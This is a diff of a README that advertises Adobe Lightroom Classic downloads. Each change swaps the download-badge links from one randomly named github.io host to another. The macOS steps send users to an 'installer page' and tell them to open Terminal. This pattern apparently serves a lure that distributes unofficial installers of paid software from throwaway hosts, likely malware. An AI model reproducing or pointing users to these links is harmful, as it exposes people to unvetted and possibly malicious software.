@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Adobe+Lightroom+Classic-31A8FF?style=for-the-badge&logo=github)](https://DikeSupporterFurnish.github.io/windows-installer/)
+[![Download](https://img.shields.io/badge/⬇_Download_Adobe+Lightroom+Classic-31A8FF?style=for-the-badge&logo=github)](https://iggoiiltktso.github.io/win-installer/)
 
 </div>
 
@@ -59,9 +59,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://DikeSupporterFurnish.github.io/windows-installer/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://iggoiiltktso.github.io/win-installer/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://DikeSupporterFurnish.github.io/macos-installer/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://iggoiiltktso.github.io/mac-get/)
 
 </div>
 
@@ -77,7 +77,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Adobe+Lightroom+Classic-31A8FF?style=for-the-badge&logo=github)](https://DikeSupporterFurnish.github.io/windows-installer/)
+[![Download](https://img.shields.io/badge/⬇_Download_Adobe+Lightroom+Classic-31A8FF?style=for-the-badge&logo=github)](https://iggoiiltktso.github.io/win-installer/)
 
 </div>
 
@@ -108,7 +108,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://DikeSupporterFurnish.github.io/macos-installer/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://iggoiiltktso.github.io/mac-get/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -133,7 +133,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Adobe+Lightroom+Classic-31A8FF?style=for-the-badge&logo=github)](https://DikeSupporterFurnish.github.io/windows-installer/)
+[![Download](https://img.shields.io/badge/⬇_Download_Adobe+Lightroom+Classic-31A8FF?style=for-the-badge&logo=github)](https://iggoiiltktso.github.io/win-installer/)
 
 </div>
 
